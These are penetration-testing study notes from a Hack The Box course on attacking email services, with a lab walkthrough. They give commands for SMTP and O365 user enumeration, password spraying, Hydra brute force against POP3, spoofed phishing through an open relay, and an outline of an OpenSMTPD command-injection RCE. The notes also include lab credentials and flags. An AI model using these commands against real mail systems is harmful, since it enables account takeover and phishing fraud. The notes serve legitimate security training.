### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - SMTP & Email Attacks & Vulnerabilities <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking Email Services



Email roles: `SMTP` sends, `POP3` / `IMAP4` retrieve. POP3 default removes mail from server; IMAP4 default keeps it.

#### Common email ports:

| Port | Service |
|---|---|
| `TCP/25` | SMTP unencrypted |
| `TCP/143` | IMAP4 unencrypted |
| `TCP/110` | POP3 unencrypted |
| `TCP/465` | SMTP encrypted |
| `TCP/587` | SMTP encrypted / [STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 encrypted |
| `TCP/995` | POP3 encrypted |

<br>

---

<br>

### Enumeration



Find the mail server via MX records:

```diff
+ $ host -t MX hackthebox.eu
+ $ host -t MX microsoft.com
+ $ dig mx inlanefreight.com | grep "MX" | grep -v ";"
+ $ host -t A mail1.inlanefreight.htb.
```

<br>

Cloud providers fingerprintable from MX value:
- `aspmx.l.google.com` -> G-Suite
- `mail.protection.outlook.com` -> Microsoft 365
- `mx.zoho.com` -> Zoho

<br>

Sweep all email ports:

```diff
+ $ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

<br>

---

<br>

### SMTP User Enumeration



Three SMTP commands enumerate users:

| Command | Purpose |
|---|---|
| `VRFY` | Verifies if a user exists |
| `EXPN` | Lists members of an alias / distribution list |
| `RCPT TO` | Returns valid / invalid based on recipient acceptance |

Manual probing via telnet:

```diff
+ $ telnet 10.10.110.20 25
+ VRFY root
+ EXPN support-team
+ MAIL FROM:test@htb.com
+ RCPT TO:john
```

<br>

POP3 user check (`USER` returns `+OK` for valid):

```diff
+ $ telnet 10.10.110.20 110
+ USER john
```

<br>

Automate with `smtp-user-enum`:

```diff
+ $ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

| Flag | Description |
|---|---|
| `-M` | mode: `VRFY`, `EXPN`, or `RCPT` |
| `-U` | userlist file |
| `-D` | domain (for RCPT) |
| `-t` | target |

<br>

---

<br>

### Cloud Email Enumeration (O365)



`o365spray` - validate domain + enumerate users:

```diff
+ $ python3 o365spray.py --validate --domain msplaintext.xyz
+ $ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

<br>

Password spray (respect lockout):

```diff
+ $ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

<br>

---

<br>

### Password Attacks



`Hydra` brute / spray against POP3:

```diff
+ $ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

For O365 / Gmail / Okta use specialized tools - generic Hydra usually gets blocked by cloud providers.

<br>

---

<br>

### Open Relay Abuse



An `open relay` accepts mail for any sender → any recipient - useful for spoofing internal-looking phishing.

Detect with Nmap:

```diff
+ $ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

<br>

Send via `swaks`:

```diff
+ $ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'http://mycustomphishinglink.com/' --server 10.10.11.213
```

<br>

---

<br>

### Latest Email Vulnerabilities - OpenSMTPD CVE-2020-7247



[CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) - OpenSMTPD <= 6.6.2 unauthenticated RCE via crafted `MAIL FROM` field. Semicolon (`;`) escapes the sender field and runs shell commands; 64-char limit.

#### Concept - initiation:

| # | Step | Category |
|---|---|---|
| 1 | User input - manual / scripted SMTP interaction. | `Source` |
| 2 | OpenSMTPD parses the email and required fields. | `Process` |
| 3 | Standard ports run as root. | `Privileges` |
| 4 | Local OpenSMTPD process is the destination. | `Destination` |

#### Concept - trigger RCE (cycle restart):

| # | Step | Category |
|---|---|---|
| 5 | Sender field with embedded shell command. | `Source` |
| 6 | Parser breaks on `;` and exec's the command. | `Process` |
| 7 | Service-level privs apply - runs as root. | `Privileges` |
| 8 | Reverse shell back to attacker. | `Destination` |

PoC: [Exploit-DB 47984](https://www.exploit-db.com/exploits/47984).

<br>

---

<br>

### SMTP Exercise

IP: 10.129.203.12

---

### Question 1:
What is the available username for the domain inlanefreight.htb in the SMTP server?

#### Bind the domain to the IP, then enumerate via SMTP RCPT.

```diff
+ $ sudo nano /etc/hosts
```

	10.129.203.12     inlanefreight.htb

#### Run `smtp-user-enum` with the HTB users.list:

```diff
+ $ smtp-user-enum -M RCPT -U users.list -t 10.129.203.12 -D inlanefreight.htb
```

	10.129.203.12: marlin@inlanefreight.htb exists

&#x1F6A9; found **mar--edit--lin**.

---

### Question 2:
Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.

#### Hydra the POP3 login with the HTB pws.list:

```diff
+ $ hydra -l "marlin@inlanefreight.htb" -P pws.list -f inlanefreight.htb pop3
```

	[110][pop3] host: inlanefreight.htb   login: marlin@inlanefreight.htb   password: poohbear

#### Auth via telnet to POP3 and read the message:

```diff
+ $ telnet 10.129.203.12 110
+ USER marlin@inlanefreight.htb
+ PASS poohbear
+ LIST
+ RETR 1
```

	flag: HTB{w34k_p4$$w0rd}

&#x1F6A9; found **HTB{w34k_--edit--p4$$w0rd}**.
